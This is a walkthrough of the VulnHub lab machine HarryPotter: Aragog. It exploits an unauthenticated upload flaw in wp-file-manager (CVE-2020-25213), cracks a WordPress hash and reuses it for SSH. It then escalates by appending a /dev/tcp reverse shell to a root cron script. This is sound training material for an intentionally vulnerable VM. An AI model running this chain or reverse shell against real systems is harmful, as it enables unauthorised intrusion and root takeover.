# HarryPotter: Aragog (1.0.2)

| | |
|---|---|
| **Platform** | VulnHub |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Status** | Free VM ✅ |
| **Series** | HarryPotter (1 of 3) — Aragog → Nagini → Fawkes |
| **Author** | Mansoor R (@time4ster) |
| **Tags** | `web` `wordpress` `rce` `privesc` `cron` |
| **Date** | 2026-10-21 |

> **Objective:** collect 2 of the 8 horcruxes hidden across the 3-box series. Aragog falls through a chain of small misconfigurations — outdated WordPress plugin → DB root creds → password reuse → writable root-cron script.

---

## 0. TL;DR — Attack chain

```mermaid
flowchart LR
  A[Recon: 22,80] --> B[wp-file-manager 6.0<br/>CVE-2020-25213]
  B --> C[www-data + horcrux 1]
  C --> D[DB creds → wp_users hash]
  D --> E[crack → password reuse → SSH as hagrid98]
  E --> F[pspy: writable root cron<br/>/opt/.backup.sh]
  F --> G[root + horcrux 2]
```

1. **Foothold** — unauthenticated file upload in wp-file-manager 6.0 → RCE as `www-data`.
2. **User** — DB root password from world-readable config → crack WP hash → reused for SSH as `hagrid98`.
3. **PrivEsc** — hidden root cron runs a user-owned script → append reverse shell → root.

---

## 1. Recon

```bash
# Host discovery
sudo netdiscover -r 192.168.55.0/24        # → 192.168.55.132

# Full TCP port scan
sudo nmap -p- --min-rate 5000 192.168.55.132 -oN ports.txt

# Service/version + default scripts
sudo nmap -sC -sV -p 22,80 192.168.55.132 -oN detail.txt
```

**Findings:**
- `22/tcp` → OpenSSH 7.9p1 (Debian 10) — no creds yet, not an entry point
- `80/tcp` → Apache httpd 2.4.38 (Debian)

With SSH useless without credentials, the web service is the only attack surface.

---

## 2. Enumeration

```bash
gobuster dir -u http://192.168.55.132 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o gobuster.txt
```

Key hit: `/blog` → WordPress.

```bash
wpscan --url http://192.168.55.132/blog/ -e ap,u --plugins-detection aggressive
```

- WordPress **5.0.12**
- Plugin **wp-file-manager 6.0** (vulnerable; latest at the time was 8.x) ← the vector
- User: `hagrid98`

---

## 3. Foothold — www-data

**Concept.** wp-file-manager bundles the third-party **elFinder** file manager. Its server-side *connector* (`lib/php/connector.minimal.php`) was reachable **directly, bypassing WordPress authentication**, and accepted file-management commands including `upload`. In version 6.0 this allows **unauthenticated arbitrary file upload** → PHP webshell → RCE. This is **CVE-2020-25213**.

Using the Metasploit module:

```
use exploit/multi/http/wp_file_manager_rce
set RHOSTS 192.168.55.132
set TARGETURI /blog/
set LHOST 192.168.55.128
run
```

> **Gotcha.** `TARGETURI` defaults to `/`, but WordPress lives under `/blog`. Left unchanged, the module requests `http://<ip>/wp-content/...`, gets a 404, and reports *"Exploit completed, but no session was created."*

Result: Meterpreter session as `www-data`.

---

## 4. Horcrux 1 + database credentials

The first horcrux sits in a home directory, world-readable (`-rw-r--r--`):

```bash
cat /home/hagrid98/horcrux1.txt
# horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}

echo 'MTogUmlkRGxF...' | base64 -d
# 1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
```

This is a **Debianised** WordPress install. `/usr/share/wordpress/wp-config.php` holds only defaults and includes a host-specific config from `/etc/wordpress/`:

```bash
cat /etc/wordpress/config-*.php
```

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
```

WordPress talks to MySQL as **root** — full database access.

---

## 5. Lateral movement — hagrid98

```bash
mysql -u root -p'mySecr3tPass' wordpress -e "select user_login,user_pass from wp_users;"
# hagrid98 | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.
```

`$P$` is a **phpass** hash (hashcat mode `400`):

```bash
echo '$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.' > hash.txt
hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt -O
# $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.:password123
```

> `-O` (optimized kernels) also sidesteps an out-of-memory error in a RAM-constrained VM. CPU-only alternative: `john --format=phpass --wordlist=rockyou.txt hash.txt`.

The WP user is named `hagrid98`, matching a system account — and the password is **reused**:

```bash
ssh hagrid98@192.168.55.132   # password123
```

---

## 6. Privilege escalation — root

`sudo` is not installed. SUID binaries and the visible crontab are clean:

```bash
find / -perm -4000 -type f 2>/dev/null   # all standard Debian binaries
cat /etc/crontab; ls -la /etc/cron*      # default jobs only
```

Root's **personal** crontab is not readable by `hagrid98`, so observe running processes with **pspy**:

```bash
# Kali
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
python3 -m http.server 8000
# Target
cd /tmp && wget http://192.168.55.128:8000/pspy64 && chmod +x pspy64 && ./pspy64
```

```
UID=0  /bin/sh -c "bash -c /opt/.backup.sh"
UID=0  /bin/bash /opt/.backup.sh
```

Root runs `/opt/.backup.sh` **every minute**. The script is owned by our user and writable:

```bash
ls -la /opt/.backup.sh
# -rwxr-xr-x 1 hagrid98 hagrid98 81 Apr  1  2021 /opt/.backup.sh
```

Append a reverse shell (don't overwrite — keep the original logic):

```bash
echo 'bash -i >& /dev/tcp/192.168.55.128/4445 0>&1' >> /opt/.backup.sh
```

Listener on Kali:

```bash
nc -lvnp 4445
```

Within a minute cron executes the script as root and a root shell lands.

---

## 7. Horcrux 2

```bash
cat /root/horcrux2.txt
# horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}

echo 'MjogbWFSdm9MbyBH...' | base64 -d
# 2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre
```

---

## Horcruxes

| # | Decoded |
|---|---------|
| 1 | RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets |
| 2 | maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre |

---

## Takeaways

- **Patch plugins.** wp-file-manager 6.0 is a well-known unauthenticated RCE (CVE-2020-25213).
- **Least privilege for the DB.** A web app should never connect to MySQL as `root`.
- **No password reuse.** The cracked WordPress password unlocked SSH directly.
- **Audit who owns what root runs.** When the visible crontab is empty, **pspy** reveals hidden root jobs. A world-writable (or user-owned) script executed by root cron is instant privesc.

---

## Tools

`netdiscover` · `nmap` · `gobuster` · `wpscan` · `metasploit` · `mysql` · `hashcat` / `john` · `pspy`

---

## Lab setup note (VMware)

The OVA is built for VirtualBox; in VMware the NIC renames from `enp0s3` to `ens33`, so DHCP fails and the boot banner shows an empty `Machine IP`. Fix without booting the VM: attach its `.vmdk` to Kali as a second disk, then

```bash
sudo mount /dev/sdb1 /mnt
echo -e "\nallow-hotplug ens33\niface ens33 inet dhcp" | sudo tee -a /mnt/etc/network/interfaces
sudo umount /mnt
```

Detach the disk and boot — the VM now pulls an IP.
